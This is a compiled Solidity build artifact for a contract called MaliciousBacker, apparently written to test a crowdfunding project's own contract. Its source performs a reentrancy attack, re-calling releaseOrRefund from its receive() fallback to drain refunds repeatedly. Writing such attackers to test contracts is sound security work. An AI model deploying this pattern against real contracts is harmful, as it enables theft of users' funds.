{
  "contractName": "MaliciousBacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_crowdfunding",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "crowdfunding",
      "outputs": [
        {
          "internalType": "contract ICrowdfunding",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "campaignId",
          "type": "uint256"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161056d38038061056d833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b610456806101176000396000f3fe60806040526004361061002d5760003560e01c806356885cd81461011957806364dd891a1461014457610114565b366101145760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16036101125760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ba16960c60016040518263ffffffff1660e01b81526004016100df91906102ed565b600060405180830381600087803b1580156100f957600080fd5b505af115801561010d573d6000803e3d6000fd5b505050505b005b600080fd5b34801561012557600080fd5b5061012e610160565b60405161013b919061037d565b60405180910390f35b61015e600480360381019061015991906103c9565b610184565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c1cbbca734836040518363ffffffff1660e01b81526004016101de9190610405565b6000604051808303818588803b1580156101f757600080fd5b505af115801561020b573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ba16960c826040518263ffffffff1660e01b81526004016102699190610405565b600060405180830381600087803b15801561028357600080fd5b505af1158015610297573d6000803e3d6000fd5b5050505050565b6000819050919050565b6000819050919050565b6000819050919050565b60006102d76102d26102cd8461029e565b6102b2565b6102a8565b9050919050565b6102e7816102bc565b82525050565b600060208201905061030260008301846102de565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061034361033e61033984610308565b6102b2565b610308565b9050919050565b600061035582610328565b9050919050565b60006103678261034a565b9050919050565b6103778161035c565b82525050565b6000602082019050610392600083018461036e565b92915050565b600080fd5b6103a6816102a8565b81146103b157600080fd5b50565b6000813590506103c38161039d565b92915050565b6000602082840312156103df576103de610398565b5b60006103ed848285016103b4565b91505092915050565b6103ff816102a8565b82525050565b600060208201905061041a60008301846103f6565b9291505056fea26469706673582212203dc84fd9b0bba2fe5f5aff0dc60ec3d88c07f1ab74e0132dc4306176fa62202c64736f6c63430008150033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface ICrowdfunding {\r\n    function contribute(uint256 _campaignId) external payable;\r\n    function releaseOrRefund(uint256 _campaignId) external;\r\n}\r\n\r\ncontract MaliciousBacker {\r\n    ICrowdfunding public crowdfunding;\r\n    \r\n    constructor(address _crowdfunding) {\r\n        crowdfunding = ICrowdfunding(_crowdfunding);\r\n    }\r\n\r\n    function attack(uint256 campaignId) external payable {\r\n        crowdfunding.contribute{value: msg.value}(campaignId);\r\n        crowdfunding.releaseOrRefund(campaignId);\r\n    }\r\n\r\n    receive() external payable {\r\n        if (msg.sender == address(crowdfunding)) {\r\n            crowdfunding.releaseOrRefund(1);\r\n        }\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\Users\\PRUDHVI\\Desktop\\crowdfunding - Copy\\contracts\\MaliciousBacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.21+commit.d9974bed.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2025-04-30T10:55:18.459Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}